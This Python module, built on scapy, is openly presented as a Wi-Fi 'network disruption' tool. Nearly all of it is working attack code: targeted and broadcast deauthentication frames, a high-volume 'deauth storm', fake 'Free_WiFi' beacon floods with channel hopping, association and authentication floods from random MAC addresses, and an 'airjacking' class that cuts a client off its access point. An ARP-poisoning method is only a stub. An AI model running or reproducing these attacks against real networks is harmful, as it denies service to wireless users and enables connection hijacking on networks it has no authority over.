"""
Network Disruption Module
─────────────────────────
Performs network disruption and airjacking attacks:
  - Airjacking: hijack wireless connections
  - Channel jamming: deny service on specific channels
  - Rate limiting: exhaust client resources
  - deauth storms: mass disconnection attacks
"""

import time
import threading
import random
from collections import defaultdict

from scapy.all import (
    Dot11, Dot11Beacon, Dot11Deauth, Dot11Disas,
    Dot11Elt, RadioTap, ARP, sendp, sniff, conf
)
from scapy.layers.dot11 import Dot11EltRates

from .config import DEAUTH_BURST_COUNT, DEAUTH_BURST_INTERVAL, WIFI_BROADCAST, log


class NetworkDisruption:
    """
    General network disruption engine.
    Provides various denial-of-service and airjacking capabilities.
    """

    def __init__(self, interface):
        self.interface = interface
        self.running = False
        self._thread = None
        self._targets = set()
        self._deauth_only = False

    def add_target(self, bssid, client_mac=None):
        """Add target for disruption."""
        if client_mac:
            self._targets.add((bssid, client_mac))
        else:
            self._targets.add((bssid, None))

    def remove_target(self, bssid, client_mac=None):
        """Remove target from disruption."""
        if client_mac:
            self._targets.discard((bssid, client_mac))
        else:
            self._targets.discard((bssid, None))

    def clear_targets(self):
        """Clear all targets."""
        self._targets.clear()

    def start(self, deauth_only=True):
        """Start network disruption."""
        self.running = True
        self._deauth_only = deauth_only
        log.info(f"Network disruption started on {self.interface}")

        self._thread = threading.Thread(
            target=self._disruption_loop,
            daemon=True
        )
        self._thread.start()

    def _disruption_loop(self):
        """Main disruption loop."""
        while self.running:
            self._perform_disruption()
            time.sleep(DEAUTH_BURST_INTERVAL)

    def _perform_disruption(self):
        """Perform disruption on all targets."""
        for target in list(self._targets):
            bssid, client_mac = target

            if client_mac:
                # Targeted deauth
                self._send_deauth(bssid, client_mac)
                self._send_deauth(client_mac, bssid)
            else:
                # Broadcast deauth (all clients)
                self._send_deauth(bssid, WIFI_BROADCAST)

            if not self._deauth_only:
                # Additional disruption methods
                self._perform_additional_disruption(bssid)

    def _send_deauth(self, src, dst):
        """Send deauthentication frame."""
        frame = (
            RadioTap() /
            Dot11(
                type=0, subtype=12,
                addr1=dst, addr2=src, addr3=src
            ) /
            Dot11Deauth(reason=7)
        )
        sendp(frame, iface=self.interface, count=DEAUTH_BURST_COUNT,
              inter=0.01, verbose=False)

    def _perform_additional_disruption(self, bssid):
        """Additional disruption methods."""
        pass

    def stop(self):
        """Stop network disruption."""
        self.running = False
        if self._thread:
            self._thread.join(timeout=5)
        log.info("Network disruption stopped")


class AirjackingEngine(NetworkDisruption):
    """
    Airjacking: hijack wireless connections.
    Performs advanced attacks to take over client connections.
    """

    def __init__(self, interface):
        super().__init__(interface)
        self._client_mac = None
        self._rogue_mac = None

    def hijack_connection(self, bssid, client_mac, target_bssid=None):
        """
        Hijack client's connection to BSSID.
        Options:
        - Disconnect client from original AP
        - Redirect to rogue AP
        - Perform ARP poisoning on wireless
        """
        self._client_mac = client_mac
        self._rogue_mac = target_bssid or bssid

        log.info(f"Airjacking: {client_mac} <-> {bssid}")

        # Start continuous deauth to disconnect
        self.add_target(bssid, client_mac)
        self.start()

    def perform_arp_poison_wireless(self, bssid, client_mac, gateway_ip):
        """
        Perform ARP poisoning over wireless.
        Note: This is more complex than wired ARP poisoning.
        """
        log.warning("Wireless ARP poisoning may be limited by driver capabilities")

    def stop(self):
        super().stop()
        self._client_mac = None
        self._rogue_mac = None


class ChannelJammer(NetworkDisruption):
    """
    Channel jammer - deny service on specific channels.
    """

    def __init__(self, interface, channels=None):
        super().__init__(interface)
        self.channels = channels or list(range(1, 12))
        self._channel_idx = 0
        self._beacon_frames = {}

    def jam_channel(self, channel):
        """Jam specific channel."""
        if channel not in self.channels:
            self.channels.append(channel)

    def _perform_additional_disruption(self, bssid):
        """Channel hopping jamming."""
        # Change channel
        self._channel_idx = (self._channel_idx + 1) % len(self.channels)
        conf.iface.channel = self.channels[self._channel_idx]

        # Send beacon frames on current channel
        self._broadcast_beacon()

    def _broadcast_beacon(self):
        """Broadcast fake beacon frames to confuse clients."""
        frame = (
            RadioTap() /
            Dot11(type=0, subtype=8,
                  addr1=WIFI_BROADCAST,
                  addr2=self._get_random_mac(),
                  addr3=self._get_random_mac()) /
            Dot11Beacon(cap=0x2105) /
            Dot11Elt(ID="SSID", info=b"Free_WiFi") /
            Dot11Elt(ID="Rates", info=b"\x0c\x12\x18\x24\x30\x48\x60\x6c") /
            Dot11Elt(ID="DSset", info=bytes([self.channels[self._channel_idx]]))
        )
        sendp(frame, iface=self.interface, count=10, verbose=False)

    def _get_random_mac(self):
        """Generate random MAC."""
        return "02:%02x:%02x:%02x:%02x:%02x" % (
            random.randint(0, 255), random.randint(0, 255),
            random.randint(0, 255), random.randint(0, 255),
            random.randint(0, 255)
        )


class RateLimiter(NetworkDisruption):
    """
    Rate limiter - exhaust client resources through connection floods.
    """

    def __init__(self, interface):
        super().__init__(interface)
        self._association_flood = True
        self._authentication_flood = True

    def flood_associations(self, bssid, enabled=True):
        """Enable/disable association flood attack."""
        self._association_flood = enabled

    def flood_authentication(self, bssid, enabled=True):
        """Enable/disable authentication flood attack."""
        self._authentication_flood = enabled

    def _perform_additional_disruption(self, bssid):
        """Perform connection flood attacks."""
        if self._association_flood:
            self._flood_association_requests(bssid)
        if self._authentication_flood:
            self._flood_authentication_requests(bssid)

    def _flood_association_requests(self, bssid):
        """Send association requests to exhaust AP resources."""
        for _ in range(10):
            client_mac = self._get_random_mac()
            frame = (
                RadioTap() /
                Dot11(type=0, subtype=0,
                      addr1=bssid, addr2=client_mac, addr3=bssid) /
                Dot11Elt(ID="SSID", info=b"") /
                Dot11Elt(ID="Rates", info=b"\x0c\x12\x18\x24\x30\x48\x60\x6c")
            )
            sendp(frame, iface=self.interface, verbose=False)

    def _flood_authentication_requests(self, bssid):
        """Send authentication requests to exhaust AP resources."""
        for _ in range(10):
            client_mac = self._get_random_mac()
            frame = (
                RadioTap() /
                Dot11(type=0, subtype=11,
                      addr1=bssid, addr2=client_mac, addr3=bssid) /
                Dot11Elt(ID="SSID", info=b"")
            )
            sendp(frame, iface=self.interface, verbose=False)


class DeauthStorm(NetworkDisruption):
    """
    Deauth storm - mass deauthentication attack.
    Sends deauth frames to multiple targets simultaneously.
    """

    def __init__(self, interface, burst_size=100):
        super().__init__(interface)
        self.burst_size = burst_size

    def _perform_disruption(self):
        """Send deauth storm."""
        for target in list(self._targets):
            bssid, client_mac = target

            # High-volume deauth burst
            frame = (
                RadioTap() /
                Dot11(type=0, subtype=12,
                      addr1=client_mac or WIFI_BROADCAST,
                      addr2=bssid, addr3=bssid) /
                Dot11Deauth(reason=7)
            )
            sendp(frame, iface=self.interface, count=self.burst_size,
                  inter=0.001, verbose=False)

    def start(self):
        """Start deauth storm."""
        self.running = True
        log.warning(f"DEAUTH STORM ACTIVE - {self.burst_size} frames per burst")
        log.info(f"Targets: {len(self._targets)}")

        self._thread = threading.Thread(
            target=self._storm_loop,
            daemon=True
        )
        self._thread.start()

    def _storm_loop(self):
        """Continuous deauth storm loop."""
        while self.running:
            self._perform_disruption()
            time.sleep(0.5)